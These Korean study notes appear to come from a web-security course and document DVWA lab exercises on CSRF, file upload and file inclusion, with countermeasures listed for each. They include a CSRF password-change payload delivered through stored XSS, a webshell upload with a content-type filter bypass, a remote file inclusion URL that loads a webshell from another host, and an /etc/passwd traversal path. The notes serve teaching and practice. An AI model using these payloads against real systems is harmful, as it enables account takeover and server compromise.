250724
XSS > 사용자의 쿠키 탈취


//CSRF : XSS 관련 취약점으로 입/출력 값 검증 부재로 공격자가 게시물 또는 URL을 통해 삽입한 악성 스크립트가 실행되면 사용자가 자신의 의지와는 무관하게 공격자가 의도한 요청을 특정 웹사이트에 보내도록 만드는 취약점.

1. CSRF실습 : 게시글을 눌렀을 때 비밀번호 변경 요청을 보내도록 하기
1.1. CSRF_GET_low
StoredXSS 게시판에 아래 스크립트를 넣었고
<img src="http://192.168.126.129/DVWA/vulnerabilities/csrf/?password_new=1234&password_conf=1234&Change=Change">
게시판을 확인하니 요청하지 않은 요청 패킷이 서버로 보내진 것을 확인하였음.
그리고 응답 패킷 200을 확인하였고, 다시 로그인 과정을 통해 비밀번호가 변경된 것을 확인하였음.

1.2. CSRF_POST_low
	1. 공격하고자 하는 기능 확인 및 선택 > 게시판 > 패킷 분석(POST)
	2. 해당 패킷을 기반으로 악성 스크립트를 만들기
(참고)오탐보다 미탐이 없도록
(참고)생성형 AI 쓸때 안쓸때 구분 잘하고, 필요한 부분에 잘 활용할 수 있도록.

<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Get input
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];

    // Do the passwords match?
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );

        // Update the database
        $current_user = dvwaCurrentUser();
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . $current_user . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

        // Feedback for the user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with passwords matching
        echo "<pre>Passwords did not match.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>

<img src="http://192.168.126.129/DVWA/vulnerabilities/csrf/?password_new=posttest&password_conf=posttest&Change=Change">

1.3. CSRF_POST + StoredXSS : 게시판 접속 시 게시판의 글이 늘어나게


1.4. CSRF 대응방안
> 0. XSS 입/출력 값 검증 : 목표만 다른 같은 방식의 공격이고, XSS가 가능하다는 전제하에 발생하는 공격이기 때문
> 1. Referer 보기 : HTTP header에 포함되어 있는 refer 정보를 체크하여 정상적으로 전송된 패킷인지 확인
>> HTTP Header 에 존재하는 Referer 검증 : Referer 값을 확인하여 해당 요청이 신뢰할 수 있는 출처에서 전달된 것인지 검증.
> 2. CSRF 토큰 : 요청 전달 시 서버에서 생성한 고유한 토큰을 함 께 전송하여 요청의 유효성을 검증.
> 3. samesite 쿠키 설정, 4. GET 대신 POST 사용, 5. Captcha(보조 방법)

(참고) 실습 진행 중 변경된 비밀번호을 잃어버리는 등 문제 발생시 "Host/setup.php"에서 초기화 가능

2. File Upload 취약점 : 파일 업로드 기능이 존재하는 서비스에서 업로드 되는 파일에 대한 검증이 존재하지 않는 경우 악성 파일 업로드가 가능한 취약점
> 보통 해당 공격의 경우 파일은 "웹셀"
> 취약점1 : 파일 업로드에 대한 기본적인 검증이 없는 것(악성파일에 대한 검증 부재)
>> 이미지(jpg,gif,bmp등), 문서(hwp,docx,xls 등)만 제외하고 모든 확장자 제한
> 취약점2 : 업로드된 파일의 경로가 노출되어있음.(업로드 경로 노출)
>> 경로가 노출되는 경우 : 업로드 시 요청패킷이나 응답패킷에 포함되어 있거나, 파일 다운로드 시
>> 대응방안 : 경로가 노출되지 않도록 삭제 혹은 노출되어도 해당 파일에 접근할 수 없게
> 취약점3 : 시스템 내의 특정 파일을 실행시킬 수 있음.(파일 실행 가능)
>> 시스템 단에서 파일 혹은 디렉터리에 대한 권한 설정

단순하게 발견한 취약점에 대한 부분만으로 진단하는 것이 아니라 특정 취약점 발견 시 관련 해당 취약점에 대해 모든 시스템을 체크해야함.


2.1. low
http://192.168.126.129/DVWA/hackable/uploads/webshell.php


2.2. medium
"Your image was not uploaded. We can only accept JPEG or PNG images."
> 이미지 인지 체크하는 필터가 추가되어 있음.(취약점1)
> 패킷 분석 :
>> Content-type : HTTP 헤더에 존재하는 필드로 데이터의 타입을 알 수 있음.
>>> ex) TEST.TXT 파일 업로드하면 > text/plain
>>> ex) TEST.JPG 또는 TEST.PNG 파일 업로드 시 > image/png, image/jpeg

우회하기 위해 content-type를 변경해서 패킷 전송 해보자.
된다.
> 해당 취약점을 위한 필터는 확장자를 검증하거나 content-type를 검증하여 동작함.
https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload

https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html

3. File Inclusion 취약점
> File Inclusion() 기능을 악용하여 동적으로 파일을 로드 할 때 발생하는 취약점으로 시스템 파일을 읽어오거나 공격자가 만들어둔 외부에 있는 소스코드를 include 하도록 유도하는 취약점
> LFI(Local~), RFI(Remote~)로 나뉘는 취약점
> LFI ex) DVWA 페이지에서 GET으로 디렉터리 접근.
3.1 RFI 예제 및 레벨업하여 실습
> "hfs.exe" : 웹 공유폴더 프로그램
http://192.168.0.53/webshell.php
http://192.168.126.129/DVWA/vulnerabilities/fi/?page=http://192.168.0.53/webshell.php

> 보여주기만 : "fsdjka", Base64, ../../../etc/passwd

> medium 실습

